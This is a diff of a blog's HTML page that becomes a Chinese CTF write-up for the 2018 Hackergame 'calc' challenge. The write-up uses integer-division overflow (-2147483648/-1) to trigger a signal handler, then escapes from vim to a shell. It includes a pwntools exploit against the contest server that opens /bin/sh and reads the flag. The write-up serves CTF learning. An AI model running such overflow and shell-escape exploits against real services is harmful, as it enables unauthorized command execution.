@@ -72,7 +72,7 @@
 
 
 
-  <meta name="keywords" content="Hexo, NexT" />
+  <meta name="keywords" content="pwn,ctf,Integer Overflow," />
 
 
 
@@ -83,16 +83,23 @@
 
 
 
-<meta name="description" content="To be better">
-<meta property="og:type" content="website">
-<meta property="og:title" content="D4rk3r&#39;s blog">
-<meta property="og:url" content="http://yoursite.com/tags/arm/index.html">
+<meta name="description" content="挺有意思的一道题，用到了之前刷bandit的一些技巧，程序的漏洞就是利用指令的整数溢出执行err函数然后getshell     程序就是一个简单计算器的实现，但是init函数中设置了几个signal，然后err函数可以让我们执行一个linux的程序，所以我们首先是想着如何触发信号机制去执行err函数，可以看到几个signal信号中最有可能被我们利用的就是浮点异常，一般浮点异常我们最容易想到的就是">
+<meta name="keywords" content="pwn,ctf,Integer Overflow">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[2018Hackergame] calc ">
+<meta property="og:url" content="http://yoursite.com/2018/10/12/2018Hackergame-calc/index.html">
 <meta property="og:site_name" content="D4rk3r&#39;s blog">
-<meta property="og:description" content="To be better">
+<meta property="og:description" content="挺有意思的一道题，用到了之前刷bandit的一些技巧，程序的漏洞就是利用指令的整数溢出执行err函数然后getshell     程序就是一个简单计算器的实现，但是init函数中设置了几个signal，然后err函数可以让我们执行一个linux的程序，所以我们首先是想着如何触发信号机制去执行err函数，可以看到几个signal信号中最有可能被我们利用的就是浮点异常，一般浮点异常我们最容易想到的就是">
 <meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5808046-6856e70c10f35c47.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5808046-f6d8533adeb8fc87.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5808046-dab75ae3ba1219cd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5808046-a93ef84c6dee9051.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:updated_time" content="2018-10-12T03:50:46.376Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="D4rk3r&#39;s blog">
-<meta name="twitter:description" content="To be better">
+<meta name="twitter:title" content="[2018Hackergame] calc ">
+<meta name="twitter:description" content="挺有意思的一道题，用到了之前刷bandit的一些技巧，程序的漏洞就是利用指令的整数溢出执行err函数然后getshell     程序就是一个简单计算器的实现，但是init函数中设置了几个signal，然后err函数可以让我们执行一个linux的程序，所以我们首先是想着如何触发信号机制去执行err函数，可以看到几个signal信号中最有可能被我们利用的就是浮点异常，一般浮点异常我们最容易想到的就是">
+<meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/5808046-6856e70c10f35c47.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
 
 
 
@@ -122,13 +129,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/tags/arm/"/>
+  <link rel="canonical" href="http://yoursite.com/2018/10/12/2018Hackergame-calc/"/>
 
 
 
 
 
-  <title>标签: arm | D4rk3r's blog</title>
+  <title>[2018Hackergame] calc  | D4rk3r's blog</title>
   
 
 
@@ -157,7 +164,7 @@
     
   
 
-  <div class="container sidebar-position-left ">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
 <a href="https://github.com/hacker-mao" class="github-corner" aria-label="View source on Github"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
@@ -253,54 +260,258 @@
           <div id="content" class="content">
             
 
-  
-  
-  
-  <div class="post-block tag">
+  <div id="posts" class="posts-expand">
+    
 
-    <div id="posts" class="posts-collapse">
-      <div class="collection-title">
-        <h1>arm<small>标签</small>
-        </h1>
-      </div>
+  
 
-      
-        
+  
+  
+  
 
   <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/12/2018Hackergame-calc/">
 
-      <h2 class="post-title">
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="D4rk3r">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/head.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="D4rk3r's blog">
+    </span>
+
+    
+      <header class="post-header">
+
         
-            <a class="post-title-link" href="/2018/09/27/arm-pwn/" itemprop="url">
-              
-                <span itemprop="name">arm pwn</span>
-              
-            </a>
         
-      </h2>
+          <h1 class="post-title" itemprop="name headline">[2018Hackergame] calc </h1>
+        
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2018-09-27T20:23:38+08:00"
-              content="2018-09-27" >
-          09-27
-        </time>
-      </div>
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-10-12T10:51:19+08:00">
+                2018-10-12
+              </time>
+            
 
-    </header>
-  </article>
+            
 
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index">
+                    <span itemprop="name">pwn</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2018/10/12/2018Hackergame-calc/" class="leancloud_visitors" data-flag-title="[2018Hackergame] calc ">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">热度&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+                 <span>℃</span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  635
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  2
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>挺有意思的一道题，用到了之前刷bandit的一些技巧，程序的漏洞就是利用指令的整数溢出执行err函数然后getshell</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/5808046-6856e70c10f35c47.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="main"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/5808046-f6d8533adeb8fc87.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="init"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/5808046-dab75ae3ba1219cd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="err"></p>
+<ul>
+<li>程序就是一个简单计算器的实现，但是init函数中设置了几个signal，然后err函数可以让我们执行一个linux的程序，所以我们首先是想着如何触发信号机制去执行err函数，可以看到几个signal信号中最有可能被我们利用的就是浮点异常，一般浮点异常我们最容易想到的就是除数为0的计算，然而这里程序会检测除数是否为0</li>
+</ul>
+<p><img src="https://upload-images.jianshu.io/upload_images/5808046-a93ef84c6dee9051.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="signal信号"></p>
+<ul>
+<li>但是还有一种除法溢出（<strong><em>对DIV和IDIV指令，如果字节操作时，被除数的高8 位绝对值大于除数的绝对值，或在字操作时，被除数的高16 位绝对值大于除数的绝对值，就会产生溢出，也就是说结果(商)超过了目标寄存器AL 或AX 所能存放数的范围。</em></strong>），计算机会自动产生一个中断类型号为0的除法错中断，相当于执行了除数为0的运算，也就是说我们需要让被除数的高16位绝对值大于除数的高16位绝对值，可以直接用最负整数除以-1即可，这里signed int表示的最负整数是-2147483648，所以直接用-2147483648/-1</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; bin(0x80000000)   #-2147483648</span><br><span class="line">&apos;0b10000000000000000000000000000000&apos;</span><br><span class="line">&gt;&gt;&gt; bin(0xffffffff)    #-1</span><br><span class="line">&apos;0b11111111111111111111111111111111&apos;</span><br><span class="line">&gt;&gt;&gt; int(&apos;1&apos;*16,2)</span><br><span class="line">65535</span><br><span class="line">&gt;&gt;&gt; int(&apos;1&apos;+&apos;0&apos;*16,2)</span><br><span class="line">65536</span><br><span class="line">可以看到-2147483648的高16位绝对值大于-1的高16位绝对值，会触发除法溢出</span><br></pre></td></tr></table></figure>
+<ul>
+<li>err函数允许我们执行一个程序，我们可以利用vim特有的:!/bin/sh或者:e file来getshell或者读取flag文件</li>
+</ul>
+<p>exp:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import time</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">#p = process(&apos;./calc&apos;)</span><br><span class="line">p = remote(&apos;202.38.95.46&apos;,12008)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&apos;&gt;&gt;&gt; &apos;,&apos;-2147483648/-1&apos;)</span><br><span class="line">p.sendlineafter(&apos;\n&apos;,&apos;vim&apos;)</span><br><span class="line">time.sleep(3)</span><br><span class="line"></span><br><span class="line">#get shell</span><br><span class="line">p.sendline(&apos;:!/bin/sh&apos;)</span><br><span class="line">p.sendline(&apos;cat ./-&apos;)</span><br><span class="line">p.recvuntil(&apos;flag&apos;)</span><br><span class="line">flag = &apos;flag&apos; + p.recvuntil(&apos;&#125;&apos;)</span><br><span class="line">print flag</span><br><span class="line"></span><br><span class="line">#cat flag</span><br><span class="line"># p.sendline(&apos;:e .//-&apos;)</span><br><span class="line"># p.recvuntil(&apos;flag&apos;)</span><br><span class="line"># flag = &apos;flag&apos; + p.recvuntil(&apos;&#125;&apos;)</span><br><span class="line"># print flag</span><br><span class="line"></span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>
+<p>参考文章：</p>
+<ul>
+<li><a href="https://stackoverflow.com/questions/16928942/why-does-integer-division-by-zero-result-in-a-floating-point-exception" target="_blank" rel="noopener">https://stackoverflow.com/questions/16928942/why-does-integer-division-by-zero-result-in-a-floating-point-exception</a></li>
+<li><a href="https://stackoverflow.com/questions/24672767/idiv-overflow-exception-asm" target="_blank" rel="noopener">https://stackoverflow.com/questions/24672767/idiv-overflow-exception-asm</a></li>
+<li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/integeroverflow/intof/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/integeroverflow/intof/</a></li>
+<li><a href="https://www.cnblogs.com/imwtr/p/4105342.html" target="_blank" rel="noopener">https://www.cnblogs.com/imwtr/p/4105342.html</a></li>
+<li><a href="https://23r3f.github.io/2018/10/10/%E4%B8%AD%E7%A7%91%E5%A4%A7hackergame/#" target="_blank" rel="noopener">https://23r3f.github.io/2018/10/10/%E4%B8%AD%E7%A7%91%E5%A4%A7hackergame/#</a></li>
+</ul>
 
       
     </div>
+    
+    
+    
 
+    
+
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    D4rk3r
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://yoursite.com/2018/10/12/2018Hackergame-calc/" title="[2018Hackergame] calc ">http://yoursite.com/2018/10/12/2018Hackergame-calc/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/pwn/" <i class="fa fa-tag"></i> pwn</a>
+          
+            <a href="/tags/ctf/" <i class="fa fa-tag"></i> ctf</a>
+          
+            <a href="/tags/Integer-Overflow/" <i class="fa fa-tag"></i> Integer Overflow</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/10/11/noxCTF-noxComputers/" rel="next" title="[noxCTF] noxComputers">
+                <i class="fa fa-chevron-left"></i> [noxCTF] noxComputers
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
   </div>
   
   
   
+  </article>
 
-  
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
@@ -308,6 +519,15 @@
 
 
           
+
+  
+    <div class="comments" id="comments">
+      <div id="lv-container" data-id="city" data-uid="MTAyMC8zOTUwNS8xNjAzMg=="></div>
+    </div>
+
+  
+
+
 
         </div>
         
@@ -573,6 +793,10 @@
   
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
 
   
 
@@ -601,6 +825,17 @@
 
 
 
+  
+    <script type="text/javascript">
+      (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    </script>
   
 
 
